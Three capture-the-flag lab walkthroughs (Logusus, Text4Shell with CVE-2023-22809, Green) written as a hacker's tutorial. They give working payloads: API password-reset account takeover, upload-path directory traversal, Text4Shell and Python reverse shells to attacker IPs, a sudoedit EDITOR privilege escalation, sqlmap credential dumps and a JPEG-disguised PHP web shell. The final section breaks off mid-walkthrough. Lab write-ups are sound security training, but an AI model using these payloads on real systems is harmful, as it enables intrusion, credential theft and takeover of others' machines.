# Logusus (Medium)
<hr>

`1.png`

## PortScan

Lets use rustscan

command:```rustscan -a 10.8.0.2 -- -A```

`2.png`

We have 2 open ports, port 22 which runs the ssh and port 80 which runs the http service. Our enumeration will be focuesed on port 80

## Enumeration (Port 80)

Navigating to the webpage

```3.png```

We have a login page, but then we don't have a username and password

`4.png`
`5.png`

Checking the ```/profile``` directory, we see this

`6.png`

So we have `Dashboard`,`Swagger`,`IAM`,`Profile` and `About`

Lets check the Dashboard

```7```

You can see we don't have any data available, this is because we are not logged in actually

Lets check for Swagger

`8`

Ladies and Gentlemen with us here is an API target hehe

Lets start with this endpoint ```/api/v1/user/public```

`9`

We got emails and ids for 2 users, user `lilian` and user `elian`

Checking Swagger again, we have this endpoint

`10`

So we can do a password change for users once we know their user id, since we have 2 user ids, we can try to change password for one of the users.

Lets change password for user ```lilian```

`11`

You should get this response after executing

`12`

Niceeee, now we can login as user ```lilian```

```
login: lilian.mcclure@logusus.sec-dojo.com
password: Password123
```

`13`
`14`

Now that we are logged in, lets enumerate further

Going back to Swagger you should get this

`15`

Good, lets continue

`16`

In the response you got, you should see this

`17`

This means we have 5 users in total, one of the user has an access level of 50, two of those users has an access level of 99, while the last two users have an access level of 1.

From swagger we can try to update the access level of a particular user, all we need is the token and email of that user. Since we have lilian's token lets try to update her access level

`18`

Lets execute this

`19`

From the above screenshot, we can see that we don't have the permisson to update a user access leve, well this is because we don't have managerial permissions



Now this is where it gets crazy😂, I did a bit of roundabout💀😂

Have you ever seen a directory traversal using a file upload path??

Well, let me show you, this might be unintended though

I actually figured this out after solving the lab, did a bit of experiment after solving the lab. That was when I found out that I had been trapped in a Genjutsu😅.

Lets get the flag😎

Since we have an account as user lilian, from swagger we can try to change the user's avatar

This is what we'll do
```
1. upload an image file
2. capture the request on burpsuite, send to repeater then clear the contents of that png file
3. we'll edit the name of the file and perform a directory traversal
```
All we need to achieve this is just lilian's token, and to get this token you can just click on "copy token" 

`20`

Checking burpsuite

`21`

I had this, so I sent it over to repeater

`22`

Now we can clear the content of this png file

`23`

Yup, something like that

It's time for some directory traversal, since we know that the user flag is located in ```/home/local.txt``` and the root flag is located in ```/root/proof.txt```, we'll edit ```sqli.png``` and replace with ```/../../../home/local.txt``` and ```/../../../root/proof.txt```, one of these should get us the flag

#### request

`24`

#### response

`25`

We got that base64 encoded text from our response, lets try to decode this

command:```echo "Cg==" | base64 -d```

`26`

oops, the file is empty hehe

Lets see if we can grab the root flag

#### request

`27`

#### response

`28`

We got a base64 encoded text, lets decode this

command:```echo "TG9ndXN1c19ncm91cF8xMzcwNi1qYm02d296dWQ0NWNydnlveDNsb2h1b2Fsd2QxbWttdwo=" | base64 -d```

`flag`

Niceeeeeee, we got our flag😎

FLAG:-```Logusus_group_13706-jbm6wozud45crvyox3lohuoalwd1mkmw```

-----------------------------------------

# Text4Shell & CVE-2023-22809 (Easy)
<hr>

`1`

## PortScanning

Lets use rustscan to scan for open ports

command:```rustscan -a 10.8.0.2 -- -A```

`2`

From our scan we have 2 open ports, port 22 which runs the ssh service and port 8080 which runs the http service. Our enumeration today will be focused on port 80


## Enumeration (Port 80)

Navigate to the webpage

`3`

This is a page under maintenance, but then we get a "welcome Guest" message, lets see if we can change users

`4`

We have a "welcome default" now, lets see if we can change that default to say "BlackAnon"

`5`

It worked, the name of this lab actually pointed us to the vulnerability

When you paste "Text4Shell" on Google, you get this

`6`

We can see it has its own cve code, well lets exploit hehe


## Exploitation

You can read more about the exploit [here](https://medium.com/mii-cybersec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd)

So we'll be using this payload ```${script:javascript:java.lang.Runtime.getRuntime().exec('payload')}```

First lets try to check if I can get a connection back to my machine, we can use netcat for this

payload:```$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('nc%2010.8.0.3%201234')%7D```

Ensure you edit the ```IP``` and ```PORT``` number

Also, ensure you set up your netcat listener to the port number you used

Using the payload

`7`

Checking my netcat listener

`8`

I got a connection, lets go ahead to get a reverse shell

payload:```$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('busybox%20nc%2010.8.0.3%201234%20-e%20sh')%7D```

`9`

Checking my netcat listener

`10`

We got a reverse shell hehe, lets stabilize this

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=screen
```

`11`

Nice, we can grab the user flag

`12`

Lets escalate our privileges



# Privilege Escalation

Running the ```sudo -l``` command

`13`

We can use ```sudoedit``` on ```/etc/hosts``` to escalate our privileges

From the name of the lab we can see name of this particular CVE (CVE-2023-22809)

Doing my research

`14`

Niceeeeeee, root don sure😂

I actually used this [blog](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/)

`15`

So to exploit this we have to specify the file we want to edit then run ```sudoedit``` on the ```/etc/hosts``` file

To get the root flag you can choose to either get a root shell or just read the root flag direcly

I actually didn't get a root shell, which means I read the root flag directly since I already knew the root flag to be in ```/root/proof.txt```

commands
```
export EDITOR="nano -- /root/proof.txt"
sudoedit /etc/hosts
```

`16`
`17`

We got our root flag

--------------------------------------

# Green (Easy)
<hr>

`1`
`2`

For this lab we have 2 different sub labs (2 different ips)

Lets get started

## Portscanning (10.8.0.3)

We'll use rustscan

command:```rustscan -a 10.8.0.3 -- -A```

`3`

We have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration will be focused on port 80

## Enumeration (10.8.03)

Navigate to the webpage

`4`

The language in the above screenshot is French, we can use the google translate feature to translate the page

`5`

We can see a login page

Well, we can use default creds to gain access here

username:```admin```
password:```password```

`6`
`7`

We got admin access, and then a form actually

This actually screams SQLi. Lets exploit this


# Exploitation (10.8.0.3)

I used sqlmap for this

`8`

Capture this request on burpsuite and save it in a file `req1.txt`

`9`

We'll run sqlmap on this request

command:```sqlmap -r req1.txt --dbs```

`10`

We got 8 databaes, the most interesting database here is the credentials database. Lets dump the tables in this database

command:```sqlmap -r req1.txt -D credentials --tables```

`11`

We have a table in that particular database, lets dump the contents of that particular table

command:```sqlmap -r req1.txt -D credentials -T users --columns --dump```

`12`

we got user credentials, but then these creds weren't working for the login page

Recall we have a port running the ssh service(port 22), lets ssh into the server as user ```green```

command:```ssh green@10.8.0.3```

`13`

We are in, the user flag isn't present on this machine this means we have to escalate our privileges to grab the root flag


## Privilege Escalation (10.8.0.3)

Running the `sudo -l` command

`14`

We can see from the above screenshot that nmap can be used to help escalate our privileges

Lets grab a command from [GTFOBins](https://gtfobins.github.io/)

command:```sudo nmap -iL /root/proof.txt```

This helps us read the root flag without getting a root shell

`15`

We got the root flag

We have 2 flags left to capture

Lets move on to the next target



##  PortScanning (10.8.0.2)

We'll be using rustscan

command:```rustscan -a 10.8.0.2 -- -A```

`16`

From our scan we have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. Our enumeration today will be focused on port 80

## Enumeration (10.8.0.2)

Navigate to the webpage

`17`

We have a file upload functionality here, lets fuzz for directories to see if we have an ```uploads``` directory

command:```ffuf -u "http://10.8.0.2/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup ```

`18`

Yup, there's an ```uploads``` directory.

To get RCE on this target we'll bypass the file upload functionality so we can upload our malicious script


## Exploitation (10.8.0.2)

Lets cook our malicious script

payload:```AAAA<?php system($_GET['cmd']); ?>```

Store this payload in a file (abeg.php), then use the “hexeditor” tool to modify the ```abeg.php``` header to a ```.jpeg``` header.
  
`19`

Now, lets use hexeditor to modify the header of this file

command:```hexeditor abeg.php```

`20`

From the above screenshot, you will see that the AAAA has the header ```41 41 41 41```, we'll modify the header to that of a .jpeg file. Checking it up online I found it to be ```FF D8 FF EE```

`21`

Now that we have modified the header, save it and exit (hit ctrl +x, then hit the enter button to exit).

Using the cat command to read the file you will observe it is different from what we initially put there

`21.5`

Now, that we've successfully modified the header. We can go ahead to upload our file

`22`
`23`

To get our RCE, just use this ```http://10.8.0.2/uploads/abeg.php?cmd=id```

`24`

I got my reverse shell using this python payload ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.0.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```

`25`

We are in, 



















